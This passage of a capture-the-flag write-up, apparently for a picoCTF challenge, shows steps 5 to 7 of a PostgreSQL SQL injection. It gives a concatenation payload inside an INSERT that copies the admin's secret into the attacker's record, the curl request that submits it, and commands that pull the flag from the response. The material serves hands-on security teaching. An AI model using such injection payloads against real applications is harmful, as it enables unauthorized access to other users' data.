Step 5: Craft the SQL Injection Payload

We need to inject SQL that will retrieve the admin's secret. The original query is:
sql

INSERT INTO secrets(owner_id, content) VALUES ('[user_id]', '[content]')

Using PostgreSQL string concatenation (||), we can inject a subquery that fetches the admin's secret:

Payload:
sql

' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb') || '

When injected, the query becomes:
sql

INSERT INTO secrets(owner_id, content) VALUES ('[user_id]', '' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb') || '')

This concatenates the subquery result (the flag) into the content field.
Step 6: Execute the SQL Injection

Send the payload to the vulnerable endpoint:
bash

curl -X POST http://candy-mountain.picoctf.net:64342/secrets/create \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b cookies.txt \
  --data-urlencode "content=' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb') || '"

The --data-urlencode flag ensures special characters are properly encoded.
Step 7: Retrieve the Flag

Now that the admin's secret is stored in our secrets list, we can view it:
bash

curl -X GET http://candy-mountain.picoctf.net:64342/ \
  -b cookies.txt

To extract just the flag from the HTML response:
bash

curl -s -X GET http://candy-mountain.picoctf.net:64342/ \
  -b cookies.txt | grep -o "picoCTF{.*}"
